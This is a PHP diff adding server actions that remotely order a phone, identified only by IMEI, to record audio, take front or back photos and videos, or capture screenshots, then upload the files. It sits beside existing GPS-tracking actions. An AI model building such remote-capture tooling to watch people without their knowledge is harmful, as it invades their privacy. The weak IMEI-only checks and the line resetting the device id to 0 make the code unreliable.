@@ -5,6 +5,10 @@
 
 require_once '../model/data_access/access.php';
 require_once '../model/data_access/lang.php';
+require_once 'filing.php';
+
+
+define("path_mobile",    "device_");
 
 session_start();
 if (!isset($_REQUEST["act"])) {
@@ -454,11 +458,103 @@ switch ($_REQUEST["act"]) {
         }
         //TODO: set proseduer
 
+
     break;
 
+    //_____________ tak photo
 
-    case'':
+    case'take_voice':
+        $valid_data = check_validation(array("IMEI"));
+        if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
+            send_msg(lang::$invalid_data, lang::$error);
+            exit;
+        }
+        $device_id = access::get_device_by_IMEI($_REQUEST["IMEI"]);
+        $id = access::set_custome_file_list($device_id,"null" , "null","null",1);
+        access::set_request($device_id,6,$id);
+        send_msg(lang::$success, lang::$message, "success");
+        break;
 
+    case'take_photo_front':
+        $valid_data = check_validation(array("IMEI"));
+        if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
+            send_msg(lang::$invalid_data, lang::$error);
+            exit;
+        }
+        $device_id = access::get_device_by_IMEI($_REQUEST["IMEI"]);
+        $id = access::set_custome_file_list($device_id,"null" , "null","null",2);
+        access::set_request($device_id,9,$id);
+        send_msg(lang::$success, lang::$message, "success");
+        break;
+
+    case'take_photo_back':
+        $valid_data = check_validation(array("IMEI"));
+        if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
+            send_msg(lang::$invalid_data, lang::$error);
+            exit;
+        }
+        $device_id = access::get_device_by_IMEI($_REQUEST["IMEI"]);
+        $id = access::set_custome_file_list($device_id,"null" , "null","null",3);
+        access::set_request($device_id,10,$id);
+        send_msg(lang::$success, lang::$message, "success");
+        break;
+
+    case'take_video_front':
+        $valid_data = check_validation(array("IMEI"));
+        if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
+            send_msg(lang::$invalid_data, lang::$error);
+            exit;
+        }
+        $device_id = access::get_device_by_IMEI($_REQUEST["IMEI"]);
+        $id = access::set_custome_file_list($device_id,"null" , "null","null",4);
+        access::set_request($device_id,7,$id);
+        send_msg(lang::$success, lang::$message, "success");
+        break;
+
+    case'take_video_back':
+        $valid_data = check_validation(array("IMEI"));
+        if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
+            send_msg(lang::$invalid_data, lang::$error);
+            exit;
+        }
+        $device_id = access::get_device_by_IMEI($_REQUEST["IMEI"]);
+        $id = access::set_custome_file_list($device_id,"null" , "null","null",5);
+        access::set_request($device_id,8,$id);
+        send_msg(lang::$success, lang::$message, "success");
+        break;
+
+    case'take_screenshot':
+        $valid_data = check_validation(array("IMEI"));
+        if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
+            send_msg(lang::$invalid_data, lang::$error);
+            exit;
+        }
+        $device_id = access::get_device_by_IMEI($_REQUEST["IMEI"]);
+        $id = access::set_custome_file_list($device_id,"null" , "null","null",6);
+        access::set_request($device_id,11,$id);
+        send_msg(lang::$success, lang::$message, "success");
+        break;
+
+    case 'upload_take_file':
+        $valid_data = check_validation(array("IMEI","id","reqid"));
+        if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
+            send_msg(lang::$invalid_data, lang::$error);
+            exit;
+        }
+        $device_id = access::get_device_by_IMEI($_REQUEST["IMEI"]);
+        $device_id = $device_id[0]["id"];
+        $device_id =0;
+        filing::$root=path_mobile.$device_id."/";
+        $result = filing::upload_file();
+        if($result != 0){
+            //TODO: update database and remove files
+            access::edit_custome_file_list($_REQUEST['reqid'],$result,filing::$root);
+            access::delete_request($_REQUEST['id']);
+            send_msg(lang::$success, lang::$message, "success");
+        }else {
+            send_msg(lang::$failed, lang::$error);
+        }
+        break;
 
     //____________ GPS Acts
     case 'set_gps':
@@ -555,8 +651,6 @@ switch ($_REQUEST["act"]) {
         access::delete_request($_REQUEST['id']);
         send_msg(lang::$success, lang::$message, "success");
         break;
-
-
 
     //_____________ get all request for device
     case 'todo':
